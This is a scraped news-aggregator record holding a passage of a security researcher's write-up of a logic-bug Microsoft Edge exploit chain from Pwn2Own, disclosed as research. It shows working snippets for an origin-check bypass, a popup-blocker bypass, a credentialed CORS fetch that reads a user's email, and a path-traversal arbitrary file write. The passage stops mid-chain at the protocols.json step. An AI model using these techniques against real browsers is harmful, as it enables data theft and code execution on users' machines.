[{"_1":2,"_3":4},"root",{"_5":149},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1793621626000,"id","xn04uir3ppltopryw25ryri8a","title","Orange Tsai 披露 Microsoft Edge 纯逻辑漏洞全链，实现沙箱逃逸与 ACE","originalTitle","The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only!","summary","Orange Tsai 披露其在 Pwn2Own Berlin 2026 构建的 Microsoft Edge 全链，通过 5 个逻辑漏洞和 2 项 Windows 功能实现沙箱逃逸并获得 $175,000 与 17.5 Master of Pwn points。","reason","作者完整拆解了仅用逻辑漏洞串联成 Microsoft Edge 沙箱逃逸与 ACE 的过程，包含根因、代码路径、0-Click 原语和协议处理器落地方法。","source",{"_74":148},"links",{"_61":147},"publishedAt","2026-10-28T00:00:00.000Z","discoveredAt","2026-10-29T00:16:07.231Z","timelineAt","category","disclosure","tags",[75,142,143,144,79,145,146],"score",90,"selected",true,"channel","news","story",{"_83":84,"_13":85},"x","readingMode","full","author","body",{"_138":-5,"_61":139,"_140":-5,"_141":59},"outline",[86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101],"relatedStories",[82],"topics",[68,69,70,71],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","original","factId","fenOHe85cBV4","reportCount",3,"additionalSourceCount",1,{"_72":80,"_74":81},{"_72":78,"_74":79},{"_72":76,"_74":77},{"_72":73,"_74":75},"slug","research","name","技术研究","vuln","漏洞披露","browser","浏览器","microsoft","Microsoft / 微软",{"_83":84,"_13":85},"publicId","efaa57e3-945a-474c-bc0f-4e68ce88979c","Orange Tsai公开Edge逻辑漏洞利用链",{"_11":136,"_103":137,"_105":108},{"_11":134,"_103":135,"_105":108},{"_11":132,"_103":133,"_105":65},{"_11":130,"_103":131,"_105":65},{"_11":128,"_103":129,"_105":65},{"_11":126,"_103":127,"_105":121},{"_11":124,"_103":125,"_105":121},{"_11":122,"_103":123,"_105":121},{"_11":119,"_103":120,"_105":121},{"_11":117,"_103":118,"_105":65},{"_11":115,"_103":116,"_105":108},{"_11":113,"_103":114,"_105":65},{"_11":111,"_103":112,"_105":65},{"_11":109,"_103":110,"_105":65},{"_11":106,"_103":107,"_105":108},{"_11":102,"_103":104,"_105":65},"sec-16","text","Orange Tsai","level","sec-15","Final Thoughts",2,"sec-14","From telnet:// to Code Execution!","sec-13","Overwriting protocols.json to Auto-Launch Protocol Handlers","sec-12","Arbitrary File Write via Immersive Reader","sec-11","Breaking Out of the Browser Sandbox","sec-10","Putting It All Together!","sec-9","4. The Need for Prior Knowledge of the Login Email",4,"sec-8","3. The Need for a Signed-In Profile","sec-7","2. The Popup Blocker","sec-6","1. The Throttle Must Be Fired from a Trusted Origin","sec-5","The 0-Click Challenges","sec-4","Sourceless Navigation: A New UXSS Primitive","sec-3","The Forgotten Navigation Throttles","sec-2","Let’s Navigate!","sec-1","The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bu","zh","<p>\n        <a href=\"https://devco.re/en/\">\n            <img src=\"/dailyinfo/media/a5c0106930f8783e.jpg\" loading=\"lazy\" decoding=\"async\">\n        </a>\n    </p><ul>\n            <li>\n                <p>\n                    <span>Services<i></i></span>\n\n                    \n                </p>\n            </li>\n\n            <li>\n                <p>\n                    <span>Research<i></i></span>\n\n                    \n                </p>\n\n\n            </li>\n\n            <li>\n                <p>\n                    <span>Company<i></i></span>\n\n                    \n                </p>\n            </li>\n            <li>\n                <p>\n                    <span>News<i></i></span>\n                    \n                </p>\n            </li>\n            <li>\n                <a href=\"https://devco.re/en/search/\">Search</a>\n            </li>\n            <li>\n                <a href=\"https://devco.re/en/contact/\">Contact</a>\n            </li>\n        </ul><ul>\n        <li>\n            <p>\n                <span>Services</span>\n                \n            </p>\n        </li>\n        <li>\n            <p>\n                <span>Research</span>\n                \n            </p>\n        </li>\n\n        <li>\n            <p>\n                <span>Company</span>\n                \n            </p>\n        </li>\n        <li>\n            <p>\n                <span>News</span>\n                \n            </p>\n        </li>\n        <li>\n            \n        </li>\n        <li>\n            <p>\n                <span><i></i>Language</span>\n                \n            </p>\n        </li>\n    </ul><p>\n                    <a href=\"https://devco.re/en/blog/category/Tech%20Editorials\">Tech Editorials</a>\n                    <span>\n\n                      <a href=\"https://devco.re/en/blog/tag/Pwn2Own/\">#Pwn2Own</a> <a href=\"https://devco.re/en/blog/tag/Microsoft%20Edge/\">#Microsoft Edge</a> <a href=\"https://devco.re/en/blog/tag/UXSS/\">#UXSS</a> <a href=\"https://devco.re/en/blog/tag/RCE/\">#RCE</a> <a href=\"https://devco.re/en/blog/tag/Vulnerability/\">#Vulnerability</a> <a href=\"https://devco.re/en/blog/tag/Windows/\">#Windows</a> \n                    </span>\n                    </p><h2 id=\"sec-1\">\n                        The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only!\n                    </h2><p>\n                        <img src=\"/dailyinfo/media/4b4d4da1b46b5570.jpg\" loading=\"lazy\" decoding=\"async\">\n                    </p><hr><p>I think I should still dump some of my work once in a while, even though it feels like fewer and fewer people actually sit down and read articles these days (or maybe now they all leave it to their agents XD). Anyway, this is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥</p><blockquote><p>Confirmed! Orange Tsai (@orange_8361) of DEVCORE Research Team (@d3vc0r3) chained 4 logic bugs to achieve a sandbox escape on Microsoft Edge, earning $175,000 and 17.5 Master of Pwn points. Full win! #Pwn2Own #P2OBerlin https://t.co/vJaIpGG4cD</p>— TrendAI Zero Day Initiative (@thezdi) <a href=\"https://x.com/thezdi/status/2054868495888777266?ref_src=twsrc%5Etfw\">May 14, 2026</a></blockquote><p>The whole chain is made up of five bugs and two Windows features. I have also shared the whole bug-hunting and chaining process at this year’s HITCON and Hexacon, plus some fun stories along the way. You can check <a href=\"https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf\">the slides here</a>!</p><p>Also, maybe everyone thinks LLMs can already pwn everything in the AI era, so something made entirely by hand somehow feels a bit more precious. That might also be why this chain was nominated for this year’s Pwnie Awards and won the Epic Achievement award. 🎉</p><p><img src=\"/dailyinfo/media/4b4d4da1b46b5570.jpg\" loading=\"lazy\" decoding=\"async\" alt=\"pwnie-award-2026\" width=\"60%\"></p><h2 id=\"sec-2\">Let’s Navigate!</h2><p>So where do we start with a logic-only full chain? Well, since it’s a “browser,” let’s start by looking at how “browsing” (or what Chromium calls “navigation”) works. I won’t go into too much detail in this post, because I think in this era, you can just ask your agents to fill in the details :)</p><p>But I’d still recommend reading “<a href=\"https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit\">Life of a Navigation</a>” from Chrome University if you want to get the full picture.</p><h3 id=\"sec-3\">The Forgotten Navigation Throttles</h3><p>While I was walking through the Chromium Navigation flow, something called “Navigation Throttles” caught my attention. They live in the Browser Process, and intercept all navigation requests initiated by either the Browser or the Renderer. Maybe it’s easy to say this in hindsight, but out of the 3,000+ CVEs Google Chrome has fixed over the past five years, there are only fewer than 20 related to them. So I guess this is also a corner not too many people pay attention to.</p><p>Anyway, I started digging into the Navigation Throttles, and checked how Google Chrome and Microsoft Edge implemented them. And while going through the code, I found that Edge has a throttle called <code>EdgeCAGuidanceNavigationThrottle</code> for its enterprise Entra ID feature (the <code>CA</code> here stands for <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview\">Conditional Access</a>). The purpose of this throttle is to guide users to the right User Profile when Edge detects them signing in with a work account on a Microsoft website. And to fire this throttle, you have to start a navigation from a specific Microsoft-owned origin, such as <code>login.live.com</code>:</p><pre><code><span>location</span><span>.</span><span>href</span> <span>=</span> <span>`https://guidance-ca-error/?email={email}&amp;switch_profile={url}`</span>\n</code></pre><p>And once the throttle is fired, Edge would compare the email of the current User Profile with <code>?email={email}</code>. If they don’t match, Edge pops up a dialog guiding you to switch accounts.</p><p><img src=\"/dailyinfo/media/6ee627925a121ca7.webp\" loading=\"lazy\" decoding=\"async\" alt=\"image\" width=\"60%\"></p><p>But if they do match, Edge would then grab the URL you were originally heading to from <code>switch_profile={url}</code>, and launch a new navigation with Chromium’s internal Navigation API:</p><pre><code><span>NavigateParams</span> <span>params</span><span>(</span><span>browser</span><span>,</span> <span>switch_profile_url</span><span>,</span> <span>ui</span><span>::</span><span>PAGE_TRANSITION_LINK</span><span>);</span>\n<span>params</span><span>.</span><span>disposition</span> <span>=</span> <span>WindowOpenDisposition</span><span>::</span><span>CURRENT_TAB</span><span>;</span>\n<span>params</span><span>.</span><span>window_action</span> <span>=</span> <span>NavigateParams</span><span>::</span><span>SHOW_WINDOW</span><span>;</span>\n\n<span>Navigate</span><span>(</span><span>&amp;</span><span>params</span><span>);</span>\n</code></pre><p>So basically, the throttle cancels the original navigation when the target URL matches a specific internal format, and then launches a new one with the URL from the attacker-controlled Query String, if the conditions are met. Since this new navigation is initiated by the Browser Process, in theory we can do a few things we couldn’t do before, such as jumping to normally prohibited pages like <code>edge://settings</code> or <code>devtools://...</code>, or even pseudo-schemes like <code>javascript:alert(origin)</code>.</p><p>Though the JavaScript pseudo-scheme sounds like a powerful primitive, you still need to obtain the Execution Context on <code>login.live.com</code> to fire the throttle in the first place. So being able to jump to <code>javascript:</code> doesn’t really give you any extra capability. At most, it’s just like a Self-XSS, or a way to turn an Open Redirect there into XSS. Either way, you’re still only executing JavaScript in the same <code>login.live.com</code> context.</p><p>Honestly, I didn’t take this bug too seriously at first glance. To me, it was just a stronger Open Redirect that could jump to a few more Browser-Level Schemes, and still needed to be chained with other bugs. So the bug just sat in my notes for weeks… 🤦‍♂️</p><h3 id=\"sec-4\">Sourceless Navigation: A New UXSS Primitive</h3><p>The turning point was when I was going over the Chromium architecture one day and started thinking: The throttle is handled in the Browser Process, so the new navigation is initiated from the browser as well. However, the page we fired the throttle from, <code>login.live.com</code>, lives in the Renderer, and while investigating the logic, I couldn’t find any code tying the Browser and Renderer together. So… <code>CURRENT_TAB</code> refers to which tab, exactly?</p><p>To find this out, I ran a quick test and added a delay to the original trigger:</p><pre><code><span>setTimeout</span><span>(</span><span>function</span><span>(){</span>\n    <span>location</span><span>.</span><span>href</span> <span>=</span> <span>`https://guidance-ca-error/?email={email}&amp;switch_profile={url}`</span>\n<span>},</span> <span>8000</span><span>)</span>\n</code></pre><p>And during the delay, we manually switched the Edge to a new tab to see what would happen, and…</p><video src=\"https://devco.re/assets/img/blog/20261028/18bebd889b986c30a918d70c61799e78.mp4\" playsinline=\"\" preload=\"none\" controls=\"\"></video><p>Boom! We got a UXSS on <code>google.com</code>, and that’s also the first bug of the whole chain. To fully understand the UXSS root cause, we dug into Chromium’s source code. We found that if <code>Navigate()</code> is called without specifying the <code>source_contents</code> (the Renderer source to bind to), Chromium would use the current active tab as the Renderer source automatically.</p><p><em>↓ <strong>Path:</strong> <a href=\"https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator.cc\">chromium/chrome/browser/ui/browser_navigator.cc</a></em></p><pre><code><span>base</span><span>::</span><span>WeakPtr</span><span>&lt;</span><span>content</span><span>::</span><span>NavigationHandle</span><span>&gt;</span> <span>Navigate</span><span>(</span><span>NavigateParams</span><span>*</span> <span>params</span><span>)</span> <span>{</span>\n\n  <span>// [...]</span>\n\n  <span>// If no source WebContents was specified, we use the selected one from the</span>\n  <span>// target browser. This must happen before GetBrowserAndTabForDisposition()</span>\n  <span>// has a chance to replace |params-&gt;browser| with another one, but after the</span>\n  <span>// above check that relies on the original source_contents value.</span>\n  <span>if</span> <span>(</span><span>!</span><span>params</span><span>-&gt;</span><span>source_contents</span> <span>&amp;&amp;</span> <span>params</span><span>-&gt;</span><span>browser</span><span>)</span> <span>{</span>\n    <span>params</span><span>-&gt;</span><span>source_contents</span> <span>=</span> <span>params</span><span>-&gt;</span><span>browser</span>\n                  <span>-&gt;</span><span>GetBrowserForMigrationOnly</span><span>()</span>\n                  <span>-&gt;</span><span>tab_strip_model</span><span>()</span>\n                  <span>-&gt;</span><span>GetActiveWebContents</span><span>();</span> <span>// &lt;--- [1] Use the active tab as the navigation source</span>\n  <span>}</span>\n\n  <span>// [...]</span>\n\n  <span>// If no target WebContents was specified (and we didn't seek and find a</span>\n  <span>// singleton), we need to construct one if we are supposed to target a new</span>\n  <span>// tab.</span>\n  <span>if</span> <span>(</span><span>!</span><span>contents_to_navigate_or_insert</span><span>)</span> <span>{</span>\n    <span>DCHECK</span><span>(</span><span>!</span><span>params</span><span>-&gt;</span><span>url</span><span>.</span><span>is_empty</span><span>());</span>\n    <span>if</span> <span>(</span><span>params</span><span>-&gt;</span><span>disposition</span> <span>!=</span> <span>WindowOpenDisposition</span><span>::</span><span>CURRENT_TAB</span><span>)</span> <span>{</span>\n      <span>// [...]</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      <span>// ... otherwise if we're loading in the current tab, the target is the</span>\n      <span>// same as the source.</span>\n      <span>DCHECK</span><span>(</span><span>params</span><span>-&gt;</span><span>source_contents</span><span>);</span>\n      <span>contents_to_navigate_or_insert</span> <span>=</span> <span>params</span><span>-&gt;</span><span>source_contents</span><span>;</span>   <span>// &lt;--- [2] Set it as the target WebContents</span>\n    <span>}</span>\n\n    <span>// Try to handle non-navigational URLs that popup dialogs and such, these</span>\n    <span>// should not actually navigate.</span>\n    <span>if</span> <span>(</span><span>!</span><span>HandleNonNavigationAboutURL</span><span>(</span>\n            <span>params</span><span>-&gt;</span><span>url</span><span>,</span> <span>contents_to_navigate_or_insert</span><span>-&gt;</span><span>GetBrowserContext</span><span>()))</span> <span>{</span>\n      <span>// Perform the actual navigation, tracking whether it came from the</span>\n      <span>// renderer.</span>\n      <span>NavigationController</span><span>::</span><span>LoadURLParams</span> <span>load_url_params</span> <span>=</span>\n          <span>LoadURLParamsFromNavigateParams</span><span>(</span><span>contents_to_navigate_or_insert</span><span>,</span>\n                                          <span>params</span><span>);</span>\n      <span>navigation_handle</span> <span>=</span>\n          <span>contents_to_navigate_or_insert</span><span>-&gt;</span><span>GetController</span><span>().</span><span>LoadURLWithParams</span><span>(</span>\n              <span>load_url_params</span><span>);</span>     <span>// &lt;--- [3] Start navigation; dispatch Mojo downstream</span>\n    <span>}</span>\n  <span>// [...]</span>\n<span>}</span>\n</code></pre><p>Though the code path requires <code>params.disposition</code> to be <code>CURRENT_TAB</code> and <code>params.source_contents</code> to be <code>NULL</code>, luckily, those are the defaults, so even Chromium’s own <a href=\"https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator_params.h;l=54\">example code</a> gets this wrong. I guess this should count as a new UXSS attack surface!</p><h3 id=\"sec-5\">The 0-Click Challenges</h3><p>The UXSS primitive we just got sounds great, but firing that still comes with quite a few challenges in practice. Here we list four we faced while weaponizing the UXSS, and how we cracked them with more and more bugs 😉.</p><h4 id=\"sec-6\">1. The Throttle Must Be Fired from a Trusted Origin</h4><p>The first challenge, as we mentioned earlier: this UXSS has to be fired from certain Microsoft sites. Though we could still find an XSS there to make that happen, that sounds like a painful job, so we’d keep it as a last resort. Instead, we decided to see if there was any low-hanging fruit in the origin check first.</p><pre><code><span>content</span><span>::</span><span>WebContents</span><span>*</span> <span>web_contents</span> <span>=</span> <span>navigation_handle</span><span>()</span><span>-&gt;</span><span>GetWebContents</span><span>();</span>\n<span>const</span> <span>GURL</span> <span>last_committed_url</span> <span>=</span> <span>web_contents</span><span>-&gt;</span><span>GetLastCommittedURL</span><span>();</span>\n\n<span>if</span> <span>(</span> <span>!</span><span>IsSupportedLoginUrl</span><span>(</span><span>last_committed_url</span><span>)</span> <span>)</span>\n    <span>return</span> <span>content</span><span>::</span><span>NavigationThrottle</span><span>::</span><span>CANCEL_AND_IGNORE</span><span>;</span>\n</code></pre><p>We found that <code>EdgeCAGuidanceNavigationThrottle</code> uses <code>GetLastCommittedURL()</code> to retrieve the origin that fired the navigation, and then check it. At first glance, this looks like the correct way to do the validation. But take a second look, and you’ll notice Microsoft seems to have forgotten that a navigation can come not just from the current <code>WebContents</code>, but also from another window… So a simple <code>window.open(...)</code> is enough to bypass it!</p><p><em>↓ You can run this on any website to fire the throttle</em></p><pre><code><span>popup</span> <span>=</span> <span>window</span><span>.</span><span>open</span><span>(</span><span>'</span><span>https://login.live.com/</span><span>'</span><span>,</span> <span>'</span><span>_blank</span><span>'</span><span>)</span>\n<span>popup</span><span>.</span><span>location</span> <span>=</span> <span>`https://guidance-ca-error/?email={email}&amp;switch_profile={url}`</span> \n</code></pre><h4 id=\"sec-7\">2. The Popup Blocker</h4><p>So far, we can bypass the origin check with a cross-window navigation. However, modern browsers don’t let webpages open new windows that easily nowadays, so here comes another new problem: the <a href=\"https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:components/blocked_content/popup_blocker.cc\">Popup Blocker</a> would block <code>window.open(...)</code> by default.</p><p><img src=\"/dailyinfo/media/890530f6af38aaf7.webp\" loading=\"lazy\" decoding=\"async\" alt=\"popup-blocker\"></p><p>To crack this, we kept reversing Microsoft Edge. And we found Microsoft, maybe for internal use, made its own hardcoded whitelist for popups… So a popup like the following would normally be blocked as expected:</p><pre><code><span>popup</span> <span>=</span> <span>window</span><span>.</span><span>open</span><span>(</span><span>'</span><span>https://malicious.tld</span><span>'</span><span>,</span> <span>'</span><span>_blank</span><span>'</span><span>)</span>      <span>// blocked</span>\n</code></pre><p>But if you swap the URL for the whitelisted one… the window just appears. And then remember to navigate it back to the original site, and you’ve bypassed the Popup Blocker!</p><pre><code><span>popup</span> <span>=</span> <span>window</span><span>.</span><span>open</span><span>(</span><span>'</span><span>about:blank#quickAuthPopup</span><span>'</span><span>,</span> <span>'</span><span>_blank</span><span>'</span><span>)</span> <span>// granted</span>\n<span>popup</span><span>.</span><span>location</span> <span>=</span> <span>'</span><span>https://malicious.tld</span><span>'</span>\n</code></pre><p>Thank you, Microsoft!</p><p><img src=\"/dailyinfo/media/a2a8482345c14a4b.webp\" loading=\"lazy\" decoding=\"async\" alt=\"thanks-microsoft\" width=\"60%\"></p><h4 id=\"sec-8\">3. The Need for a Signed-In Profile</h4><p>Now that we can fire <code>EdgeCAGuidanceNavigationThrottle</code> from wherever we want, the next step is to get past the Conditional Access checks. The code first requires Microsoft Edge to already have a signed-in User Profile, and then checks if <code>?email={email}</code> matches the profile’s email. Both conditions have to be met before we reach the sourceless, browser-initiated navigation to finally trigger our UXSS primitive.</p><pre><code><span>Profile</span><span>*</span> <span>current_profile</span> <span>=</span> <span>Profile</span><span>::</span><span>FromBrowserContext</span><span>(</span>\n    <span>web_contents</span><span>-&gt;</span><span>GetBrowserContext</span><span>());</span>\n\n<span>std</span><span>::</span><span>string</span> <span>email</span><span>;</span>\n<span>net</span><span>::</span><span>GetValueForKeyInQuery</span><span>(</span><span>target_url</span><span>,</span> <span>kEmailQueryKey</span><span>,</span> <span>&amp;</span><span>email</span><span>);</span>\n\n<span>const</span> <span>base</span><span>::</span><span>FilePath</span> <span>target_profile_path</span> <span>=</span> <span>GetPathOfProfileWithEmail</span><span>(</span><span>email</span><span>);</span>\n<span>if</span> <span>(</span><span>current_profile</span><span>-&gt;</span><span>GetPath</span><span>()</span> <span>!=</span> <span>target_profile_path</span><span>)</span> <span>{</span>\n    <span>profiles</span><span>::</span><span>SwitchToProfile</span><span>(</span><span>target_profile_path</span><span>,</span> <span>false</span><span>,</span> <span>BindOnce</span><span>(</span><span>…</span><span>));</span>\n<span>}</span>\n</code></pre><p>However, since we can’t assume the target environment has a signed-in profile in advance, we still need to find a way to make the attack work even if it doesn’t. While exploring Microsoft Edge, we came across a great feature called “OneAuth”. The feature lets any Edge WebView application automatically sign in with your current MSA credentials when visiting Microsoft-owned sites. And it turns out that starting with 25H2, <a href=\"https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/customize-oobe-in-windows-11\">Windows OOBE</a> requires you to sign in with an MSA (unless you use the local-account workaround). So even if you’ve never created a User Profile in the browser, just visiting <code>www.microsoft.com</code> is enough for Edge to create one and sign you in automatically.</p><p>Thanks again, Microsoft!</p><video src=\"https://devco.re/assets/img/blog/20261028/0c61af2810a8e37b9fc0374c86c2dcc4.mp4\" playsinline=\"\" preload=\"none\" controls=\"\"></video><h4 id=\"sec-9\">4. The Need for Prior Knowledge of the Login Email</h4><p>With the sign-in issue cracked, the last challenge is to get the victim’s email in advance. Of course, we could try some social engineering, or keep reversing Microsoft Edge to find another bug that leaks that for us. But since the automatic sign-in already sets several Microsoft cookies, we thought Web Hacking would be an easier way to steal the email. So we fired up Burp Suite and started looking for web vulnerabilities.</p><p>We spent a few hours and found several XSS bugs on Microsoft sites. While poking around, I noticed that <code>assets.msn.com</code>, which is embedded in <code>edge://new-tab-page-online</code>, returns the currently signed-in user’s email. And even more interesting, when I checked the response header, the site seemed to have a CORS misconfiguration…</p><p><img src=\"/dailyinfo/media/9f924788d9c7eaff.webp\" loading=\"lazy\" decoding=\"async\" alt=\"cors-misconfig\"></p><p>So with a simple <code>fetch(...)</code> with credentials included, you can easily grab any Microsoft Edge user’s email from any website:</p><pre><code><span>resp</span> <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>`https://assets.msn.com/service/community/users/me?profile=social&amp;it=edgeid`</span><span>,</span> <span>{</span>\n    <span>method</span><span>:</span> <span>'</span><span>GET</span><span>'</span><span>,</span> \n    <span>mode</span><span>:</span> <span>'</span><span>cors</span><span>'</span><span>,</span>\n    <span>credentials</span><span>:</span> <span>'</span><span>include</span><span>'</span><span>,</span>\n    <span>referrerPolicy</span><span>:</span> <span>'</span><span>no-referrer</span><span>'</span><span>,</span>\n    <span>headers</span><span>:</span> <span>{</span>\n        <span>'</span><span>Accept</span><span>'</span><span>:</span> <span>'</span><span>application/json</span><span>'</span>\n    <span>}</span>\n<span>})</span>\n<span>body</span> <span>=</span> <span>await</span> <span>resp</span><span>.</span><span>json</span><span>()</span>\n<span>console</span><span>.</span><span>log</span><span>(</span> <span>body</span><span>.</span><span>value</span><span>[</span><span>0</span><span>].</span><span>email</span> <span>)</span>\n</code></pre><h3 id=\"sec-10\">Putting It All Together!</h3><p>So far, to make this primitive work, we’ve chained together:</p><ul>\n  <li>A Trusted Origin bypass caused by a missing cross-window Opener check</li>\n  <li>A Popup Blocker bypass caused by a hardcoded whitelist</li>\n  <li>A OneAuth feature that automatically signs you in</li>\n  <li>A CORS misconfiguration that lets us steal the signed-in user’s email</li>\n</ul><p>Now we can finally trigger the UXSS without a single click! And even better, since this UXSS is initiated from the Browser Process (<code>HandleRendererDebugURL</code> in Mojo, if you’re interested), it can ignore any CSP entirely. That means we can run JavaScript on <code>google.com</code>, <code>facebook.com</code>, <code>icloud.com</code>, or whatever website we want!</p><h2 id=\"sec-11\">Breaking Out of the Browser Sandbox</h2><p>So we have a Universal XSS. Does it mean that we can do whatever we want? If we’re talking about Web Security, then yes. But our goal here is to get ACE (Arbitrary Code Execution), so UXSS alone is far from enough. And we still need to find a way to break out of the Browser Sandbox to turn this UXSS into code execution.</p><p>The first and most straightforward idea that came to my mind was: since we can run JavaScript on any website, or more precisely, any origin, why not just leverage privileged WebUI pages like <code>edge://settings</code> or <code>edge://downloads</code> to get ACE?</p><p>This naive approach was of course already mitigated by the Chromium developers. In the Renderer’s Mojo handler, there’s an extra check: if the origin belongs to one of the following privileged WebUIs, the Renderer simply ignores the JavaScript URL.</p><pre><code><span>edge</span>\n<span>chrome</span><span>-</span><span>extension</span>\n<span>chrome</span>\n<span>chrome</span><span>-</span><span>untrusted</span>\n<span>chrome</span><span>-</span><span>distiller</span>\n<span>chrome</span><span>-</span><span>error</span>\n<span>chrome</span><span>-</span><span>native</span>\n<span>chrome</span><span>-</span><span>search</span>\n<span>devtools</span>\n<span>// more...</span>\n</code></pre><p><em>↓ <strong>Path:</strong> <a href=\"https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/core/frame/local_frame.cc\">chromium/third_party/blink/renderer/core/frame/local_frame.cc</a></em></p><pre><code><span>void</span> <span>LocalFrame</span><span>::</span><span>LoadJavaScriptURL</span><span>(</span><span>const</span> <span>KURL</span><span>&amp;</span> <span>url</span><span>)</span> <span>{</span>\n  <span>// Protect privileged pages against bookmarklets and other JavaScript</span>\n  <span>// manipulations.</span>\n  <span>if</span> <span>(</span><span>SchemeRegistry</span><span>::</span><span>ShouldTreatURLSchemeAsNotAllowingJavascriptURLs</span><span>(</span>\n          <span>GetSecurityContext</span><span>()</span>\n              <span>-&gt;</span><span>GetSecurityOrigin</span><span>()</span>\n              <span>-&gt;</span><span>GetOriginOrPrecursorOriginIfOpaque</span><span>()</span>\n              <span>-&gt;</span><span>Protocol</span><span>()))</span> <span>{</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n  <span>// [...]</span>\n<span>}</span>\n</code></pre><p><em>↓ <strong>Path:</strong> <a href=\"https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/platform/weborigin/scheme_registry.cc\">chromium/third_party/blink/renderer/platform/weborigin/scheme_registry.cc</a></em></p><pre><code><span>bool</span> <span>SchemeRegistry</span><span>::</span><span>ShouldTreatURLSchemeAsNotAllowingJavascriptURLs</span><span>(</span>\n    <span>const</span> <span>String</span><span>&amp;</span> <span>scheme</span><span>)</span> <span>{</span>\n  <span>DCHECK_EQ</span><span>(</span><span>scheme</span><span>,</span> <span>scheme</span><span>.</span><span>LowerASCII</span><span>());</span>\n  <span>if</span> <span>(</span><span>scheme</span><span>.</span><span>empty</span><span>())</span>\n    <span>return</span> <span>false</span><span>;</span>\n  <span>return</span> <span>GetURLSchemesRegistry</span><span>().</span><span>not_allowing_javascript_urls_schemes</span><span>.</span><span>Contains</span><span>(</span>\n      <span>scheme</span><span>);</span>\n<span>}</span>\n</code></pre><p>Basically, Chromium has put every privileged WebUI you can think of on the <code>not_allowing_javascript_urls_schemes</code> blacklist. So at that point, I still got stuck for a long while. 😖</p><h3 id=\"sec-12\">Arbitrary File Write via Immersive Reader</h3><p>However, as we continued exploring Microsoft Edge, we found that Edge had its own Reading Mode called <a href=\"https://support.microsoft.com/en-us/education/learning-accelerators/use-immersive-reader-in-microsoft-edge-1\">Immersive Reader</a>. And unlike Chrome’s built-in Reading Mode, Immersive Reader seems to have been forked from Chromium early on, with Microsoft building on top of it. So instead of the old <code>chrome-distiller://</code> or the blacklisted <code>chrome-untrusted://</code>, Edge uses a custom <code>read://</code> scheme. And Microsoft seems to have forgotten to add this scheme to the blacklist as well, so our UXSS works on this privileged WebUI :)</p><p>Starting from this privileged WebUI, we can access lots of native C++ objects through JavaScript. And one of them called <code>chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles()</code> looked particularly interesting to me. We tried it out, and found that the function takes two parameters, a filename and a JSON string:</p><p><em>↓ We ran this on <code>read://https_orange.tw/?url=https://orange.tw</code></em></p><pre><code><span>chrome</span><span>.</span><span>edgeFeedbackPrivate</span><span>.</span><span>zipDiagnosticLogFiles</span><span>(</span>\n    <span>'</span><span>LOL.ZIP</span><span>'</span><span>,</span> \n    <span>'</span><span>{\n        \"logFiles\": {\n            \"ORANGE\": \"AAAAAAAA\"\n        }, \n        \"deviceInfo\": {1337: 1337}\n    }</span><span>'</span>\n<span>)</span>\n</code></pre><p>While playing with it, we observed that Microsoft Edge would first create a temporary folder and write <code>AAAAAAAA</code> to the file <code>ORANGE.json</code>. It would then pack the whole folder into <code>LOL.ZIP</code>, upload it to a Microsoft server, and clean everything up afterward. Of course, you’d want to try <code>../</code>… Yes, it does let you escape the temporary folder. But that <code>.json</code> extension is still a bit annoying. Maybe you’re also wondering if a NULL Byte could get rid of it… Of course it can! So now we have an arbitrary file write that can control both the filename and the content, and we can overwrite any file anywhere we want!</p><p>Thank you again and again, Microsoft!</p><p><img src=\"/dailyinfo/media/72a441fa225257af.jpg\" loading=\"lazy\" decoding=\"async\" alt=\"a_slide1_smooth\"></p><h3 id=\"sec-13\">Overwriting <code>protocols.json</code> to Auto-Launch Protocol Handlers</h3><p>Now, we’ve got almost all the pieces. The last step is figuring out how to turn a browser-level arbitrary file write into ACE to complete the chain. We observed that Microsoft Edge would do some interesting side-loading while initializing, such as reading a bunch of config files or loading DLLs from a writable folder.</p><p>So the DLL side-loading sounds juicy. However, since our file write is wrapped in JSON, the content has to be a valid UTF-8 string. And because Microsoft Edge is a 64-bit process, we’d have to drop a 64-bit DLL, too. After spending some time working on this, we found that we couldn’t construct a valid 64-bit PE header that met the UTF-8 requirement in any case, so we gave up on DLL side-loading.</p><p>We ended up solving this in a less obvious way. We found that besides OneAuth, Edge also loads a bunch of components while initializing, and one of them is “AutoLaunchProtocolsComponent”. The component would read a configuration file called <code>protocols.json</code> from a folder we can write to, and that file defines which origins are allowed to launch which URL protocol handlers. So by overwriting the file, we can launch any protocol handler from any origin.</p><p><em>↓ <strong>Path:</strong> <a href=\"https://devco.re/blog/2026/10/28/the-last-proof-of-human-craft-forging-a-microsoft-edge-full-chain-with-logic-bugs-only-en/#procotols-json\">AppData\\Local\\Microsoft\\Edge\\User Data\\AutoLaunchProtocolsComponent\\1.0.0.10\\protocols.json</a></em></p><pre><code><span>{</span><span>\n  